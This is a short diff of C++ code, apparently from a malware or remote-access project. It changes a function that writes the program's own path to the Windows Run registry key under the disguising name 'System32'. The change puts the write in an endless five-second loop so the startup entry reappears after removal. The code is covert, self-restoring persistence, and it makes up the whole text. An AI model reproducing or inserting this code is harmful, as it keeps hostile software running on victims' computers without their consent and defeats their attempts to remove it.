@@ -338,12 +338,15 @@ class Helpers
 
 		static void addstartup()
 		{
-			TCHAR path[100];
-			GetModuleFileName(NULL, path, 100);
-			HKEY newValue;
-			RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
-			RegSetValueEx(newValue, "System32", 0, REG_SZ, (LPBYTE)path, sizeof(path));
-			RegCloseKey(newValue);
+			while (true) {
+				TCHAR path[100];
+				GetModuleFileName(NULL, path, 100);
+				HKEY newValue;
+				RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
+				RegSetValueEx(newValue, "System32", 0, REG_SZ, (LPBYTE)path, sizeof(path));
+				RegCloseKey(newValue);
+				Sleep(5000);
+			}
 		}
 
 		static void removeRegInstallKey() {
